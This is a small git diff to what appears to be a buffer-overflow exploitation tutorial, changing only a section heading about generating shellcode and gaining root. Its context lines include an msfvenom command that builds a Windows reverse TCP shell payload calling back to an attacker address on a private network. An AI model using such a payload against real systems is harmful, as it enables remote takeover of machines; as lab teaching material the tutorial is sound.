@@ -77,7 +77,7 @@ then run `module_finder.py`
 _____________________________________________________________
 
 
-## 7- Generating Shellcoding and Gaining Root
+## 7- Generating Shellcode and Gaining Root
 
 generate a payload with msfvenom in Kali
 `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.5.108 LPOST=9999 EXITFUNC=thread -f c -a x86 -b "\x00"`
